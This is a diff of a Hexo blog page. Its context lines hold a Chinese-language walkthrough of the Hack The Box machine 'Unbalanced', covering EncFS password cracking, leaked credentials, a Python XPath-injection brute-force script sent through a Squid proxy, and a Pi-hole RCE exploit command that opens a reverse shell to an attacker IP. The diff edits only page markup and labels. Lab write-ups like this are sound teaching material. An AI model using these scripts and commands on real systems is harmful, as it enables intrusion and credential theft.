@@ -124,8 +124,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -147,7 +154,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -226,23 +233,9 @@
 <li><a href="https://github.com/vgough/encfs" target="_blank" rel="noopener">https://github.com/vgough/encfs</a></li>
 </ul>
 <h2 id="3128-proxy"><a href="#3128-proxy" class="headerlink" title="3128 proxy"></a>3128 proxy</h2><p>3128是一个代理，直接访问是错误页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082003.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082003.jpg" alt=""></p>
 <p>将其作为代理使用：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082004.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082004.jpg" alt=""></p>
 <h1 id="EncFS"><a href="#EncFS" class="headerlink" title="EncFS"></a>EncFS</h1><h2 id="解密密码"><a href="#解密密码" class="headerlink" title="解密密码"></a>解密密码</h2><p>解密需要密码，可以使用john：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/john/encfs2john.py files/ &gt; encfs6.xml.john</span><br><span class="line"></span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt  encfs6.xml.john</span><br><span class="line">[sudo] password for miao:</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])</span><br><span class="line">Cost 1 (iteration count) is 580280 for all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">bubblegum        (files/)</span><br><span class="line">1g 0:00:00:17 DONE (2020-08-19 10:53) 0.05707g/s 41.09p/s 41.09c/s 41.09C/s bambam..marissa</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
 
@@ -250,23 +243,9 @@
 <h2 id="解密文件"><a href="#解密文件" class="headerlink" title="解密文件"></a>解密文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install encfs</span><br><span class="line"></span><br><span class="line">encfsctl export files decrypt</span><br><span class="line">EncFS Password:</span><br><span class="line">directory decrypt does not exist.</span><br><span class="line">The directory "decrypt" does not exist. Should it be created? (y,N) Y</span><br></pre></td></tr></table></figure>
 
 <p>解密后的文件是各种配置文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082001.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082001.jpg" alt=""></p>
 <h2 id="squid-conf"><a href="#squid-conf" class="headerlink" title="squid.conf"></a>squid.conf</h2><p>在squid.conf中找到一个域名和密码：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082002.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082002.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intranet.unbalanced.htb</span><br><span class="line">Thah$Sh1</span><br></pre></td></tr></table></figure>
 
 <h1 id="squid"><a href="#squid" class="headerlink" title="squid"></a>squid</h1><p>通过squid，我们可以得到更多信息</p>
@@ -276,44 +255,16 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">intranet.unbalanced.htb</span><br><span class="line">172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb</span><br><span class="line">172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb</span><br></pre></td></tr></table></figure>
 
 <p>直接通过代理访问ip得到：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082005.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082005.jpg" alt=""></p>
 <p>配置hosts：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">172.31.179.1 intranet.unbalanced.htb</span><br><span class="line">172.31.179.2 intranet-host2.unbalanced.htb</span><br><span class="line">172.31.179.3 intranet-host3.unbalanced.htb</span><br></pre></td></tr></table></figure>
 
 <p>然后通过域名去访问，是一个登录页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082006.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082006.jpg" alt=""></p>
 <p>这时候把域名换成ip就可以正常访问了，后面路径正确：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082007.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082007.jpg" alt=""></p>
 <h2 id="X-Path注入"><a href="#X-Path注入" class="headerlink" title="X-Path注入"></a>X-Path注入</h2><p>简单尝试可以发现有明显的注入，但不是SQL注入，而是X-Path注入,最简单的payload即可，得到一部分信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082008.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082008.jpg" alt=""></p>
 <p> 参考资料：</p>
 <ul>
 <li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH</a> Injection)</li>
@@ -326,14 +277,7 @@
 <h2 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.31.179.1/intranet.php"</span></span><br><span class="line">proxy = <span class="string">"http://10.10.10.200:3128"</span></span><br><span class="line">letters = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789!@#$%"</span></span><br><span class="line">users = [<span class="string">'sarah'</span>, <span class="string">'rita'</span>, <span class="string">'jim'</span>, <span class="string">'bryan'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">    data = &#123;<span class="string">"Username"</span>: <span class="string">''</span>, <span class="string">"Password"</span>: <span class="string">"' or username= '"</span> + user + <span class="string">"'or substring(Password,1,1)='p' or'"</span>&#125;</span><br><span class="line">    request = requests.post(url, data=data, proxies=&#123;<span class="string">'http'</span>:proxy&#125;)    </span><br><span class="line">    length = len(request.text)    </span><br><span class="line">    p4ss = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>):        </span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> letters:            </span><br><span class="line">            data = &#123;<span class="string">"Username"</span>: <span class="string">''</span>, <span class="string">"Password"</span>: <span class="string">"' or username= '"</span> + <span class="string">"&#123;&#125;"</span>.format(user) + <span class="string">"'or substring(Password,&#123;&#125;,1)='&#123;&#125;' or'"</span>.format(str(i),l)&#125;</span><br><span class="line">            request1 = requests.post(url, data=data, proxies=&#123;<span class="string">'http'</span>:proxy&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"&#123;&#125;@unbalanced.htb"</span>.format(user) <span class="keyword">in</span> request1.text <span class="keyword">and</span> len(request1.text) != <span class="number">6756</span>:</span><br><span class="line">                print(<span class="string">"Got hit for User '&#123;&#125;' - Letter is '&#123;&#125;'"</span>.format(user, l))</span><br><span class="line">                p4ss += l</span><br><span class="line">                print(str(i))</span><br><span class="line">                print(str(p4ss))</span><br><span class="line">                <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>上面爆破得到的账号密码，bryan的可以ssh登录，得到user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082009.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082009.jpg" alt=""></p>
 <h1 id="搜集信息"><a href="#搜集信息" class="headerlink" title="搜集信息"></a>搜集信息</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bryan@unbalanced:~$ cat TODO</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Intranet <span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########</span></span></span><br><span class="line">* Install new intranet-host3 docker [DONE]</span><br><span class="line">* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]</span><br><span class="line">* Test intranet-host3 [DONE]</span><br><span class="line">* Add intranet-host3 to load balancer [DONE]</span><br><span class="line">* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]</span><br><span class="line">* Fix intranet-host2 [DONE]</span><br><span class="line">* Re-add intranet-host2 to load balancer (set default weight) [DONE]</span><br><span class="line">- Fix intranet-host1 [TODO]</span><br><span class="line">- Re-add intranet-host1 to load balancer (set default weight) [TODO]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Pi-hole <span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##########</span></span></span><br><span class="line">* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]</span><br><span class="line">* Set temporary admin password [DONE]</span><br><span class="line">* Create Pi-hole configuration script [IN PROGRESS]</span><br><span class="line">- Run Pi-hole configuration script [TODO]</span><br><span class="line">- Expose Pi-hole ports to the network [TODO]</span><br></pre></td></tr></table></figure>
 
 <p> 注意这一行,下一步的提示：</p>
@@ -346,39 +290,18 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bryan@unbalanced:~$ curl 172.31.11.3</span><br><span class="line"></span><br><span class="line">    &lt;html&gt;&lt;head&gt;</span><br><span class="line">        &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/&gt;</span><br><span class="line">        &lt;link rel='stylesheet' href='/pihole/blockingpage.css' type='text/css'/&gt;</span><br><span class="line">    &lt;/head&gt;&lt;body id='splashpage'&gt;&lt;img src='/admin/img/logo.svg'/&gt;&lt;br/&gt;Pi-&lt;b&gt;hole&lt;/b&gt;: Your black hole for Internet advertisements&lt;br&gt;&lt;a href='/admin'&gt;Did you mean to go to the admin panel?&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 <p>可以在外部通过代理访问：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082010.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082010.jpg" alt=""></p>
 <h1 id="Pi-hole"><a href="#Pi-hole" class="headerlink" title="Pi-hole"></a>Pi-hole</h1><p>搜索能够得到一个需要认证的RCE：</p>
 <ul>
 <li>Pi-hole &lt; 4.4 - Authenticated Remote Code Execution - Linux webapps Exploit<br><a href="https://www.exploit-db.com/exploits/48442" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/48442</a></li>
 </ul>
 <p>直接使用默认密码admin即可登录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082011.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082011.jpg" alt=""></p>
 <h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>因为exp没有配置代理选项，而这个pihole是需要通过代理访问的，我们可以把端口转发出来方便操作：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8181:172.31.11.3:80 bryan@10.10.10.200</span><br></pre></td></tr></table></figure>
 
 <p>然后访问我们本机的8181端口就相当于访问远程pihole：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082012.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082012.jpg" alt=""></p>
 <h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p>然后就是exp直接打，反弹shell：</p>
 <p>exp用的这个：</p>
 <ul>
@@ -387,28 +310,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2020-8816.py http://127.0.0.1:8181 admin 10.10.14.17 9999</span><br></pre></td></tr></table></figure>
 
 <p>得到www-root的shell：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082013.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082013.jpg" alt=""></p>
 <h2 id="pihole-config-sh"><a href="#pihole-config-sh" class="headerlink" title="pihole_config.sh"></a>pihole_config.sh</h2><p>然后在/root目录下有个配置文件，在里面有一个密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">ph_install.sh</span><br><span class="line">pihole_config.sh</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat pihole_config.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Add domains to whitelist</span></span><br><span class="line">/usr/local/bin/pihole -w unbalanced.htb</span><br><span class="line">/usr/local/bin/pihole -w rebalanced.htb</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set temperature unit to Celsius</span></span><br><span class="line">/usr/local/bin/pihole -a -c</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Add <span class="built_in">local</span> host record</span></span><br><span class="line">/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set privacy level</span></span><br><span class="line">/usr/local/bin/pihole -a -l 4</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set web admin interface password</span></span><br><span class="line">/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set admin email</span></span><br><span class="line">/usr/local/bin/pihole -a email admin@unbalanced.htb</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
 
 <h1 id="root-txt"><a href="#root-txt" class="headerlink" title="root txt"></a>root txt</h1><p>上面得到的密码就是root密码，外部直接切到root，得到root.txt:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bUbBl3gUm$43v3Ry0n3!</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082014.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082014.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/vgough/encfs" target="_blank" rel="noopener">https://github.com/vgough/encfs</a></li>
 <li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH</a> Injection)</li>
@@ -425,7 +334,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-12-07T00:44:33.095Z" itemprop="dateUpdated">2020-12-07 08:44:33</time>
+    Last updated: <time datetime="2020-12-07T00:44:33.095Z" itemprop="dateUpdated">2020-12-07 08:44:33</time>
 </span><br>
 
 
@@ -592,11 +501,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
